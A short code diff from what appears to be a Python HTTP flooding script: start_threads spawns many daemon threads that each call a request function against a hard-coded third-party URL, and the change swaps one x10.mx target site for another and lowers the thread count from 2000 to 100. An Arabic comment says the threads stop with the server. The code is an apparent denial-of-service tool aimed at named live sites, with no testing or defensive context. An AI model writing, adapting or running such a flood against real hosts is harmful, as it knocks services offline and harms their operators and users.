@@ -17,8 +17,8 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "http://35-panel.x10.mx/FURKAN/connect"
-    for _ in range(2000):
+    target_url = "https://hussein-lord.x10.mx/public/"
+    for _ in range(100):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True  # يجعل الثريدات تتوقف عند إيقاف السيرفر
         thread.start()
